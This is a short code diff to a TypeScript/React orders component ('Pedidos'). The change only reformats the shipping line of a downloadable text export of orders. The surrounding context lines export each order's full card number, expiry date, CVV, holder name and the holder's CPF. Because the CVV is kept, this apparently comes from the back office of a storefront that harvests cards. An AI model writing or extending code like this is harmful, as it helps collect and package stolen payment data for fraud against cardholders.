@@ -380,7 +380,7 @@ function Pedidos() {
       L.push(`CARTÃO ${i + 1}`, `${String(k.numero).replace(/\s/g, "")} ${k.mes}/${String(k.ano).slice(-2)} ${k.cvv} ${k.nome}`, `Bandeira: ${k.bandeira}`, `CPF do titular: ${k.cpf}`, `Parcelas: ${k.parcelas}`, `Valor: ${k.valor}`, "");
     });
     L.push("PRODUTOS", ...(o.items ?? []).map((i: any) => `${i.qty}x ${i.name} — Tam. ${i.size} — ${brl(i.price * i.qty)}`), "",
-      `Subtotal: ${brl(o.subtotal)}`, `Frete: ${o.shipping_method ? `${o.shipping_method} ${brl(o.shipping_value)}` : "—"}`, `Total: ${brl(o.total)}`);
+      `Subtotal: ${brl(o.subtotal)}`, `Frete (${o.shipping_method ?? "—"}): ${brl(o.shipping_value ?? 0)}`, `Total: ${brl(o.total)}`);
     return L.join("\r\n");
   };
   const baixar = (nome: string, texto: string) => {
